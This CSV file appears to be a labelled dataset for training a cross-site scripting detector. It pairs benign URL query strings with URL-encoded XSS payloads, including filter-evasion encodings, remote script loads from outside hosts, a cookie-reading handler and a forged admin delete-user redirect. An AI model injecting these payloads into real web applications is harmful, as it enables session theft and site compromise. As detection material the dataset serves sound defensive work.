text,label
/suki?HMACKey=HMACKey,0
/logo_stat24?sendpassword=sendpassword,0
/eeyelogo?todo=%3Cscript%20src%3D%22data%3Atext/javascript%2Calert%281%29%22%3E%3C/script%3E,1
/dk_flag?usrid=%3CEMBED%20SRC%3D%22data%3Aimage/svg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH%20A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv%20MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs%20aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw%20IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh%20TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22%20type%3D%22image/svg%2Bxml%22%20AllowScriptAccess%3D%22always%22%3E%3C/EMBED%3E,1
/2003_06?itemSite=itemSite,0
/emailthis?msq1=%3Cscript%20/%2A%2A%2A/%3E/%2A%2A%2A/confirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29/%2A%2A%2A/%3C/script%20/%2A%2A%2A/,1
/browse_Pictures?baz=baz,0
/16800?strReferrer=strReferrer,0
/search_contents?dump=%5C%5C%27%29%3B%20alert%28%5C%27xss%5C%27%29%3Bvar%20x%3D%5C%27,1
/varsity?coin=%3Cimg%20src%3Dx%20onerror%3D%5Cx32%22javascript%3Aalert%281%29%22%3E,1
/1966?component=component,0
/67832?cdir=cdir,0
/mr?modulename=modulename,0
/gay-porn?regularity=regularity,0
/sweeper?shortcut=shortcut,0
/mainscreen?ShowFunctionFields=%26lt%3BEMBED%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.swf%26quot%3B%20AllowScriptAccess%3D%26quot%3Balways%26quot%3B%26gt%3B%26lt%3B/EMBED%26gt%3B,1
/2003_q3?fheight=%26%23x000003c%3B,1
/DMCA?sum=sum,0
/5667?func=func,0
/aftereffectsbox_std?qx=qx,0
/2048?memday944=memday944,0
/lastscan?id11level=id11level,0
/20050705?recordcount=%3Cisindex/autofocus/onfocus%3Dalert%28%29%3E,1
/UserGroups?itemName=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx22onerror%3Djavascript%3Aalert%281%29%3E,1
/18978?country=%3Cscript%20/%2A%2A%2A/%3E/%2A%2A%2A/confirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29/%2A%2A%2A/%3C/script%20/%2A%2A%2A/,1
/Web_Services?classification=%3C%3BSCRIPT%3E%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%3B/SCRIPT%3E%3B,1
/002986?newtime=newtime,0
/ryan?delpref=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C/SCRIPT%3EPT%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/topictv?bulk=%26lt%3Bbr%20size%3D%5C%26quot%3B%26amp%3B%7Balert%28%26%23039%3BXSS%26%23039%3B%29%7D%5C%26quot%3B%26gt%3B,1
/3550?logf=%3Cimg%20src%3Dx%20onerror%3D%5Cx10%22javascript%3Aalert%281%29%22%3E,1
/qsearch?multifieldname=a%3D%26quot%3Bget%26quot%3B%3B%26amp%3B%2310%3Bb%3D%26quot%3BURL%28%26quot%3B%26quot%3B%3B%26amp%3B%2310%3Bc%3D%26quot%3Bjavascript%3A%26quot%3B%3B%26amp%3B%2310%3Bd%3D%26quot%3Balert%28%26apos%3BXSS%26apos%3B%29%3B%26quot%3B%29%26quot%3B%3B%26%2310%3Beval%28a%2Bb%2Bc%2Bd%29%3B,1
/Lexicon?angle=%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx89javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/31506?saveconf=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx20onerror%3Djavascript%3Aalert%281%29%3E,1
/001776?http_host=http_host,0
/criminal_justice?AuthItemChild=AuthItemChild,0
/54935?typename=typename,0
/1124?sqlport=%3CSTYLE%3E%40import%27%25%28css%29s%27%3B%3C/STYLE%3E,1
/altern?editgroup=editgroup,0
/2005-39?prenom=%3CSCRIPT%20a%3D%22%3E%22%20%27%27%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/mandrakelinux?newpw2=newpw2,0
/tripod?saveZ=saveZ,0
/nav_culture?ps2pdf=ps2pdf,0
/13902?replies=replies,0
/mfc?entry=%3C%3BHEAD%3E%3B%3C%3BMETA%20HTTP-EQUIV%3D%22%3BCONTENT-TYPE%22%3B%20CONTENT%3D%22%3Btext/html%3B%20charset%3DUTF-7%22%3B%3E%3B%20%3C%3B/HEAD%3E%3B%2BADw-SCRIPT%2BAD4-alert%28%27%3BXSS%27%3B%29%3B%2BADw-/SCRIPT%2BAD4-,1
/discounts?checking=checking,0
/6608?memberTypeName=%3Ca%20href%3D%22jav%26%2397ascript%3Ajavascript%3Aalert%281%29%22%3Etest1%3C/a%3E,1
/doc-7135242?id3level=id3level,0
/Windows2000Security?fontg=fontg,0
/wpfe?usepublicip=%3Ca%20href%3D%22javascript%5Cx3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/grill?file2ch=file2ch,0
/lopt?confirmdelete=confirmdelete,0
/diagnostics?string=%22%60%27%3E%3Cscript%3E%5Cx7Ejavascript%3Aalert%281%29%3C/script%3E,1
/referafriend?m3ufilename=m3ufilename,0
/ex1?pcid=pcid,0
/ax?itemStatusID=%3CA%20HREF%3D%22http%3A//66.102.7.147/%22%3EXSS%3C/A%3E,1
/power-dvd?proceed=proceed,0
/_theme?fldDecimal=fldDecimal,0
/8145?quickmanagertv=quickmanagertv,0
/2172514?moveto=moveto,0
/chrysler?svff=%3Ca%20href%3D%22data%3Atext/html%3Bblabla%2C%26%2360%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2332%26%23115%26%23114%26%2399%26%2361%26%2334%26%23104%26%23116%26%23116%26%23112%26%2358%26%2347%26%2347%26%23115%26%23116%26%23101%26%23114%26%23110%26%23101%26%23102%26%2397%26%23109%26%23105%26%23108%26%23121%26%2346%26%23110%26%23101%26%23116%26%2347%26%23102%26%23111%26%23111%26%2346%26%23106%26%23115%26%2334%26%2362%26%2360%26%2347%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%26%238203%22%3EClick%20Me%3C/a%3E,1
/37034?limit=limit,0
/mail_2?adminemail=%3CMETA%20HTTP-EQUIV%3D%22Link%22%20Content%3D%22%3Chttp%3A//ha.ckers.org/xss.css%3E%3B%20REL%3Dstylesheet%22%3E,1
/orn2?perms3=%26lt,1
/security-policy?audioFolder=audioFolder,0
/star400?panel=panel,0
/preface?render=render,0
/18148?gr=%3CIMG%20SRC%3Dx%20onmouseup%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/0607-exploits?scalepoints=%22%3E%3Cimg%20src%3Dx%20onerror%3Dwindow.open%28%27https%3A//www.google.com/%27%29%3B%3E,1
/loader?DATE=DATE,0
/41512?markread=%3Csvg%20contentScriptType%3Dtext/vbs%3E%3Cscript%3EMsgBox%2B1,1
/webForm?phone1=phone1,0
/news_09?langID=%3CIMG%20SRC%3Dx%20onsuspend%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/dept2?ampm=%3Cobject%20data%3Ddata%3Atext/html%3Bbase64%2CPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2B%3E%3C/object%3E,1
/f-100?spy=spy,0
/elk?EVEN=%3COBJECT%20CLASSID%3D%22clsid%3A333C7BC4-460F-11D0-BC04-0080C7055A83%22%3E%3CPARAM%20NAME%3D%22DataURL%22%20VALUE%3D%22javascript%3Aalert%281%29%22%3E%3C/OBJECT%3E,1
/l_dream?templateID=templateID,0
/ASCII?website=website,0
/ARP?quest=quest,0
/Contact%20Us?gameid=gameid,0
/asktheeditors?st=st,0
/charts_t?seq=%3Cmath%3E%3Ca%20xlink%3Ahref%3D%22//jsfiddle.net/t846h/%22%3Eclick,1
/760?puremode=puremode,0
/top_rt?dfrom=%3C%21%20foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E%22%3E,1
/changes-2?isPending=%3Chtml%20onmousemove%20html%20onmousemove%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/html%20onmousemove%3E,1
/27997?severity=%3CIMG%20SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B,1
/movies-1?enablebinatreflection=%26lt%3BIMG%20SRC%3D%26amp%3B%23106%3B%26amp%3B%2397%3B%26amp%3B%23118%3B%26amp%3B%2397%3B%26amp%3B%23115%3B%26amp%3B%2399%3B%26amp%3B%23114%3B%26amp%3B%23105%3B%26amp%3B%23112%3B%26amp%3B%23116%3B%26amp%3B%2358%3B%26amp%3B%2397%3B%26amp%3B%23108%3B%26amp%3B%23101%3B%26amp%3B%23114%3B%26amp%3B%23116%3B%26amp%3B%2340%3B%26amp%3B%2339%3B%26amp%3B%2388%3B%26amp%3B%2383%3B%26amp%3B%2383%3B%26amp%3B%2339%3B%26amp%3B%2341%3B%26gt%3B,1
/prior?conn=conn,0
/Anal?writeSchema=writeSchema,0
/46739?purpose=%3CIFRAME%20SRC%3D%23%20onmouseover%3D%22alert%28document.cookie%29%22%3E%3C/IFRAME%3E,1
/home_promo?evac=%3Cmarquee%20onstart%3D%27javascript%3Aalert%26%23x28%3B1%26%23x29%3B%27%3E%5E__%5E,1
/2771?start2=start2,0
/742?backconnectport=%3Cscript%3E%25%28payload%29s%3C/script%3E,1
/uf002749?saveauthors=%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27%3CSCR%27%22--%3E%3C%21--%23exec%20cmd%3D%22/bin/echo%20%27IPT%20SRC%3Dhttp%3A//www.securitycompass.com/xss.js%3E%3C/SCRIPT%3E%27%22--%3E,1
/document-management?seqnum=seqnum,0
/human?colors=colors,0
/danalysis?subop=%3Cscript%5Cx0Atype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/plenary?linkname=linkname,0
/jobfind?expirationyear=%3Ca%20href%3D%22data%3Aapplication/x-x509-user-cert%3B%26NewLine%3Bbase64%26NewLine%3B%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%26%2309%3B%26%2310%3B%26%2311%3B%3EX%3C/a,1
/vortrag?last=last,0
/QuickTime?wlk=%3C%3BEMBED%20SRC%3D%22%3Bhttp%3A//ha.ckers.org/xss.swf%22%3B%20AllowScriptAccess%3D%22%3Balways%22%3B%3E%3B%3C%3B/EMBED%3E%3B,1
/secure-webhosting?color2=color2,0
/abcnews?text0Name=%3Cscript%20x%3E%20alert%281%29%20%3C/script%201%3D2,1
/pitfalls?newText=newText,0
/000970?orderId=%3Ciframe%20%2500%20src%3D%22%26Tab%3Bjavascript%3Aprompt%281%29%26Tab%3B%22%2500%3E,1
/0321224094?pgtIou=%3CSCRIPT%3Edocument.write%28%22XSS%22%29%3B%3C/SCRIPT%3E,1
/myinfo?dizin=%26lt%3BIMG%20SRC%3D%5C%22livescript%26%23058%3B%26%2391%3Bcode%26%2393%3B%5C%22%26gt%3B,1
/brisket?via=%3CIMG%20SRC%3D%22%20%26%2314%3B%20%20javascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/interesting?marked=%3Cimg/src%3D%60%60%20onerror%3Dthis.onerror%3Dconfirm%281%29,1
/2172560?mysql=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%5Cx00%3Djavascript%3Aalert%281%29%3E,1
/BOPM?newusername=newusername,0
/21267?symbol=%3C%3F%20foo%3D%22%3E%3Cx%20foo%3D%27%3F%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E%27%3E%22%3E,1
/wintools?joined=joined,0
/Acrobat?fail=fail,0
/19358?asc=alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29//--,1
/Trading?marked=marked,0
/30563?stay=stay,0
/62466?announce=announce,0
/satellites?noRedirect=noRedirect,0
/15141?parentfieldid=%3CBR%20SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E,1
/11928?URI=URI,0
/28383?regdhcp=regdhcp,0
/003142?placeID=%3C%21--%3Cimg%20src%3D%22--%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28XSS%29//%22%3E,1
/northern_ireland?jenkins=jenkins,0
/22038?aID=aID,0
/home_title?bID=bID,0
/50766?cat=%26%23X00003c%3B,1
/asp-net?ticketid=perl%20-e%20%26%23039%3Bprint%20%5C%26quot%3B%26lt%3BSCR%5C0IPT%26gt%3Balert%28%5C%26quot%3BXSS%5C%26quot%3B%29%26lt%3B/SCR%5C0IPT%26gt%3B%5C%26quot%3B%3B%26%23039%3B%20%26gt%3B%20out,1
/Gambitron_v1?newid=newid,0
/cce?updatempd=%3Ca%20href%3D%22%5Cx20javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/199803?randkey=%22%60%27%3E%3Cscript%3E%5Cx0Ajavascript%3Aalert%281%29%3C/script%3E,1
/jxta?PRIVILEGES=%3CBODY%20onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B/%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,1
/tenebril?clientcookies=clientcookies,0
/picture_gallery?passphrase=passphrase,0
/4133?version=%26lt%3BMETA%20HTTP-EQUIV%3D%5C%22refresh%5C%22%20CONTENT%3D%5C%220%3Burl%3Ddata%26%2358%3Btext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%5C%22%26gt%3B,1
/p_up?leap=%3C%3BBR%20SIZE%3D%22%3B%26%3B%7Balert%28%27%3BXSS%27%3B%29%7D%22%3B%3E%3B,1
/77072?detail0=%3Cscript%3Edocument.vulnerable%3Dtrue%3B%3C/script%3E,1
/002606?column=column,0
/20388?merchantReference=%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EClickMe,1
/199610?id11gid=id11gid,0
/54546?tabid=tabid,0
/17302?url1=url1,0
/bel?contact=%3Cstyle%3E%3C/style%5Cx09%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,1
/64914?liveupdate=liveupdate,0
/tshirt-2?readonly=readonly,0
/46658?ping=ping,0
/ISS_RealSecure?renamefile=%26%23x00003c%3B,1
/32?totalTracks=%3Cscript%3E%25%28payload%29s%3C/script%3E,1
/001654?tz=%5C%22%3Balert%28%27XSS%27%29%3B//,1
/billspaypal?iv=%3CLINK%20REL%3D%22stylesheet%22%20HREF%3D%22http%3A//ha.ckers.org/xss.css%22%3E,1
/theguide?serverurl=%3Cdiv%20id%3Dd%3E%3Cx%20xmlns%3D%22%3E%3Ciframe%20onload%3Djavascript%3Aalert%281%29%22%3E%3C/div%3E%20%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C/script%3E,1
/001605?server=%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20aaaaaaaaa%20aaaaaaaaaa%20href%3Dj%26%2397v%26%2397script%26%23x3A%3B%26%2397lert%281%29%3EClickMe,1
/unixhck?ec=%3Ca%20href%3D%22javascript%23document.vulnerable%3Dtrue%3B%22%3E,1
/31999?cmde=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%5Cx20%3Djavascript%3Aalert%281%29%3E,1
/macosxhints?op=op,0
/wcom?repass=repass,0
/beds?phpbbdbp=%26lt%3BA%20HREF%3D%5C%22javascript%26%23058%3Bdocument%26%2346%3Blocation%3D%27http%26%2358%3B//www%26%2346%3Bgoogle%26%2346%3Bcom/%27%5C%22%26gt%3BXSS%26lt%3B/A%26gt%3B,1
/wordfusion?Filter=%22%3E%3C/iframe%3E%3Cscript%3Ealert%28%60TEXT%20YOU%20WANT%20TO%20BE%20DISPLAYED%60%29%3B%3C/script%3E%3Ciframe%20frameborder%3D%220%25EF%25BB%25BF,1
/4286?mbadmin=mbadmin,0
/pc-bsd?ntporphan=%3Cstyle%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Adocument.vulnerable%3Dtrue%22%29%3B%7D%3C/STYLE%3E%3CA%20CLASS%3DXSS%3E%3C/a%3E,1
/002559?Setting=%3COBJECT%20TYPE%3D%22text/x-scriptlet%22%20DATA%3D%22http%3A//ha.ckers.org/scriptlet.html%22%3E%3C/OBJECT%3E,1
/x-locale?check1=%3C%3BSCRIPT%3E%3Bdocument.write%28%22%3B%3C%3BSCRI%22%3B%29%3B%3C%3B/SCRIPT%3E%3BPT%20SRC%3D%22%3Bhttp%3A//ha.ckers.org/xss.js%22%3B%3E%3B%3C%3B/SCRIPT%3E%3B,1
/102791?fromdate=%3Cframeset%20onScroll%20frameset%20onScroll%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/frameset%20onScroll%3E,1
/photo-sharing?mids=mids,0
/tun-1?boardid=%3Cimg%20src%3Dxss%20onerror%3Dalert%281%29%3E,1
/roommate?INDEXCOLUMNLIST=%3Cobject%20onbeforeload%20object%20onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/object%20onbeforeload%3E,1
/DevSite?restart=%26lt%3BINPUT%20TYPE%3D%26quot%3BIMAGE%26quot%3B%20SRC%3D%26quot%3Bjavascript%3Aalert%28%26apos%3BXSS%26apos%3B%29%3B%26quot%3B%26gt%3B,1
/00000163?approved=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx27onerror%3Djavascript%3Aalert%281%29%3E,1
/54874?tarfile=%3Ca%20href%3D%22%5CxE2%5Cx80%5CxAFjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/26784?pipi=%3CIMG%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/deco?languages=%3Cscript%5Cx0Dtype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,1
/99868?debet=debet,0
/midsized?otp=%3Cimg%5Cx47src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/dongle?masdr=masdr,0
/143?confirmdelete=confirmdelete,0
/9078?not=%3Cdiv%20id%3D%22x%22%3EXXX%3C/div%3E%20%3Cstyle%3E%20%20%23x%7Bfont-family%3Afoo%5Bbar%3Bcolor%3Agreen%3B%7D%20%20%23y%5D%3Bcolor%3Ared%3B%7B%7D%20%20%3C/style%3E,1
/carpchks?feed=feed,0
/video3?publisher=%26%23x00003c,1
/WPupload?refkod=%3Cimg/src%3D%40%26%2332%3B%26%2313%3B%20onerror%20%3D%20prompt%28%27%26%2349%3B%27%29,1
/typo3?boolean=boolean,0
/marcas?fragment=fragment,0
/kalendarz?detail0=%3Cscr%3Cscript%3Eipt%3Ealert%28document.cookie%29%3C/scr%3C/script%3Eipt%3E,1
/flashgames?db=%26lt%3BSCRIPT%20SRC%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.jpg%26quot%3B%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/26083?authentication=%3Ca%20href%3D%22%5Cx1Djavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/20031020?viewResults=%26lt%3BSCRIPT%26gt%3Balert%28%26apos%3BXSS%26apos%3B%29%26lt%3B/SCRIPT%26gt%3B,1
/arpanet?uscmnds=uscmnds,0
/carolina?phone=phone,0
/242845?remark=remark,0
/pisces?req128=req128,0
/imgsystem?editf=editf,0
/Security-Software?ids=%3Ca%20href%3D%22%5Cx11javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/24674?words=words,0
/SystemRequirements?platform=platform,0
/etude?break=%3Cb%20%3Cscript%3Ealert%281%29%3C/script%3E0,1
/bookstore_on?sentitems=%3CBODY%20BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,1
/column_gaming?TracksTotal=TracksTotal,0
/btn_support?u42=ABC%3Cdiv%20style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF,1
/bul_3?shell=shell,0
/9723906?savemode=%3Cvar%20onmouseover%3D%22prompt%281%29%22%3EOn%20Mouse%20Over%3C/var%3E,1
/cerca?skip=skip,0
/iconpremium?newtemplate=%3Csvg%20onunload%20svg%20onunload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/svg%20onunload%3E,1
/Auto_Links?submit4=submit4,0
/24286?isbinddomain=isbinddomain,0
/001924?currentFolderPath=%3CFRAMESET%3E%3CFRAME%20SRC%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E%3C/frameset%3E,1
/30624?msi=msi,0
/49852?modifiedSince=modifiedSince,0
/ie6sp1?bcc=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%5Cx0C%3Djavascript%3Aalert%281%29%3E,1
/new_28x11?shortcode=shortcode,0
/Secure-Hive?findString=%3Cbody%20onscroll%3Djavascript%3Aalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,1
/ltop?asin=asin,0
/4781?boolean=boolean,0
/thinclients?numlabel=numlabel,0
/banner1?error404path=%3Cstyle%3E%3C/style%5Cx20%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,1
/ghsc?qx=%3Ca%20href%3D%22jav%26%2397ascript%3Ajavascript%3Aalert%281%29%22%3Etest1%3C/a%3E,1
/dlbox?medalid=medalid,0
/deconstr?s=s,0
/gfx_themes?PUBL=%3Cembed%20src%3D%22http%3A//corkami.googlecode.com/svn/%21svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf%22%3E,1
/msg00289?dare=%3Cstyle%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Adocument.vulnerable%3Dtrue%22%29%3B%7D%3C/STYLE%3E%3CA%20CLASS%3DXSS%3E%3C/a%3E,1
/35869?titlefeat=%3Cscript%3E%2B-%2B-1-%2B-%2Balert%281%29%3C/script%3E,1
/28595?ppdebug=ppdebug,0
/cobit?totalTracks=totalTracks,0
/bts?fdo=fdo,0
/002289?sqluser3=%3Ca%20href%3D%22%5Cx0Ejavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/rssByContentType?rownumber=rownumber,0
/new_2?dkim=dkim,0
/tutors?serverurl=%3CIMG%20STYLE%3D%22xss%3Aexpr/%2AXSS%2A/ession%28alert%28%27XSS%27%29%29%22%3E,1
/001990?PayerStatus=PayerStatus,0
/22065?hidem=%3C%3BMETA%20HTTP-EQUIV%3D%22%3Brefresh%22%3B%20CONTENT%3D%22%3B0%3B%20URL%3Dhttp%3A//%3BURL%3Djavascript%3Aalert%28%27%3BXSS%27%3B%29%3B%22%3B%3E%3B,1
/46145?u16=%3Cdiv/style%3D%22width%3Aexpression%28confirm%281%29%29%22%3EX%3C/div%3E%20%7BIE7%7D,1
/21979?dob=%3CSCRIPT%20SRC%3D//ha.ckers.org/.j%3E,1
/bottom4?cr=%3CSCRIPT%20%3D%22%3E%22%20SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/icon_mail?cfy=%3Cimg/src%3D%60%2500%60%20onerror%3Dthis.onerror%3Dconfirm%281%29,1
/augustus?categoryname=categoryname,0
/166803?sound=sound,0
/resources3?xsrf=%3Ca%20href%3D%22javas%5Cx04cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/packet_school?zonesub=zonesub,0
/latam?contenttype=contenttype,0
/OpenTopic?thumb=thumb,0
/cain_abel1163586034905?checkout=%3Cscript%20/%2A%2500%2A/%3E/%2A%2500%2A/alert%281%29/%2A%2500%2A/%3C/script%20/%2A%2500%2A/,1
/11733?fromname=fromname,0
/exeico?initialtext=initialtext,0
/002341?queryPart=queryPart,0
/105158?cable=%3Ciframe/src%3D%22data%3Atext/html%3B%26Tab%3Bbase64%26Tab%3B%2CPGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3D%3D%22%3E,1
/web-mail?image=ABC%3Cdiv%20style%3D%22x%3A%5Cx0Cexpression%28javascript%3Aalert%281%29%22%3EDEF,1
/hor?log=log,0
/lafaq?pUID=pUID,0
/dot5hosting?resetpasskey=%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx86javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/33908?start2=start2,0
/othersports?adminEnableRecovery=%26lt%3BSTYLE%26gt%3B%26%2346%3BXSS%7Bbackground-image%26%2358%3Burl%28%5C%22javascript%26%23058%3Balert%28%27XSS%27%29%5C%22%29%3B%7D%26lt%3B/STYLE%26gt%3B%26lt%3BA%20CLASS%3DXSS%26gt%3B%26lt%3B/A%26gt%3B,1
/13847?smfdbn=ABC%3Cdiv%20style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF,1
/68056?suspend=suspend,0
/13244?Help=%3Cmarquee%20onstart%3D%27javascript%3Aalert%26%23x28%3B1%26%23x29%3B%27%3E%5E__%5E,1
/Unified_Messaging?Direction=%26%23X03c%3B,1
/e?rennew=rennew,0
/laptop?maillisttmpname=maillisttmpname,0
/buy_property?newdirectory=newdirectory,0
/Myspace?sh311=%3Cevent-source%20src%3D%22%25%28event%29s%22%20onload%3D%22javascript%3Aalert%281%29%22%3E,1
/downloads22?prog=prog,0
/rate_9?id38gid=id38gid,0
/16373?debugfailover=debugfailover,0
/left_border?randkey=randkey,0
/vl?analyze=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF,1
/4317?make=Redirect%20302%20/a.jpg%20http%3A//victimsite.com/admin.asp%26deleteuser,1
